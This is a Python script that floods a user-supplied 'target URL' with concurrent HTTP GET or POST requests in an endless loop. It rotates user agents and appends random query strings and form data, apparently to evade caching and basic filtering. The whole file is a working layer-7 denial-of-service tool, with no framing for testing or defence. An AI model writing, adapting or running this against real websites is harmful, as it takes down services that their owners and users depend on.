import threading
import aiohttp
import asyncio
import random
import string
import time
import sys

# User input
url = input("Enter target URL: ").strip()
method = input("Request method (GET/POST): ").strip().upper()
threads = int(input("Number of threads: "))
delay = float(input("Delay between requests (seconds): "))
quiet = input("Quiet mode? (y/n): ").strip().lower() == 'y'

# User-agent list for rotation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11)",
    "curl/7.68.0"
]

# Generate random string
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Request function
async def send_request(session, url, method, quiet):
    try:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "*/*"
        }
        full_url = url

        if method == "GET":
            full_url += "?" + random_string(6) + "=" + random_string(8)
            async with session.get(full_url, headers=headers) as response:
                status = response.status
        elif method == "POST":
            data = {random_string(5): random_string(10)}
            async with session.post(url, data=data, headers=headers) as response:
                status = response.status
        else:
            print("Unsupported HTTP method")
            return

        if not quiet:
            print(f"[{threading.current_thread().name}] {method} {full_url} - {status}")

    except Exception as e:
        if not quiet:
            print(f"[Error] {e}")

# Async function to run multiple threads
async def run_requests():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(threads):
            tasks.append(send_request(session, url, method, quiet))
        await asyncio.gather(*tasks)

# Main function
def main():
    loop = asyncio.get_event_loop()
    while True:
        try:
            loop.run_until_complete(run_requests())
            time.sleep(delay)  # Control the delay between requests
        except KeyboardInterrupt:
            print("\n[Exiting] User interrupted the script.")
            sys.exit()

if __name__ == "__main__":
    main()
